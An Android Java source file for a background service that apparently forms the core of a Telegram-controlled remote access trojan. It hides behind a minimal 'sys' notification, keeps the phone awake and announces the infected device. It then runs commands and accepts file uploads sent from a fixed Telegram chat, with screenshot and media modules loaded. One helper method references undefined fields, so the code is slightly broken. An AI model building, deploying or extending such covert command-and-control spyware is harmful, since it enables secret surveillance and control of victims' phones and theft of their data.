package com.sec.app;

import android.app.*;
import android.content.Intent;
import android.os.*;
import androidx.core.app.NotificationCompat;
import org.json.JSONArray;
import org.json.JSONObject;

public class TelegramService extends Service {
    private volatile boolean running = true;
    private long offset = 0;
    private PowerManager.WakeLock wl;

    @Override
    public void onCreate() {
        super.onCreate();
        startForeground();
        acquireWakeLock();
    }

    private void startForeground() {
        NotificationManager m = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        NotificationChannel ch = new NotificationChannel("svc", "sys",
            NotificationManager.IMPORTANCE_MIN);
        ch.setShowBadge(false);
        m.createNotificationChannel(ch);

        Notification n = new NotificationCompat.Builder(this, "svc")
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .setContentTitle(getString(R.string.svc_notif))
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setShowWhen(false)
            .build();
        startForeground(1, n);
    }

    private void acquireWakeLock() {
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "sec:tg");
            wl.acquire();
        } catch (Exception ignored) {}
    }

    @Override
    public int onStartCommand(Intent i, int f, int id) {
        String token  = BuildConfig.TG_TOKEN;
        String chatId = BuildConfig.TG_CHAT;

        if ("TOKEN_FALLBACK".equals(token) || "CHAT_FALLBACK".equals(chatId)) {
            stopSelf();
            return START_NOT_STICKY;
        }

        TgApi.init(token, chatId);
        CmdHandler.init(this);
        ModMedia.init(this);
        ModShot.init(this);

        new Thread(() -> {
            TgApi.send("✅ Agente online | " + android.os.Build.MODEL +
                " | Android " + android.os.Build.VERSION.RELEASE);
            while (running) {
                try {
                    JSONArray updates = TgApi.getUpdates(offset);
                    for (int k = 0; k < updates.length(); k++) {
                        JSONObject u = updates.getJSONObject(k);
                        offset = u.getLong("update_id") + 1;
                        if (!u.has("message")) continue;
                        JSONObject msg = u.getJSONObject("message");
                        String cid = String.valueOf(msg.getJSONObject("chat").getLong("id"));
                        if (!cid.equals(chatId)) continue;

                        String text = msg.optString("text", "");
                        if (!text.isEmpty()) {
                            CmdHandler.exec(text);
                        } else if (msg.has("document")) {
                            CmdHandler.handleUpload(msg.getJSONObject("document"));
                        }
                    }
                } catch (Exception e) {
                    try { Thread.sleep(5000); } catch (Exception ignored) {}
                }
            }
        }).start();
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        running = false;
        if (wl != null) try { wl.release(); } catch (Exception ignored) {}
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent i) { return null; }

    private boolean configOk() {
        return TG_TOKEN != null && !TG_TOKEN.isEmpty()
            && !"TOKEN_FALLBACK".equals(TG_TOKEN)
            && TG_CHAT != null && !TG_CHAT.isEmpty()
            && !"CHAT_FALLBACK".equals(TG_CHAT);
    }
}
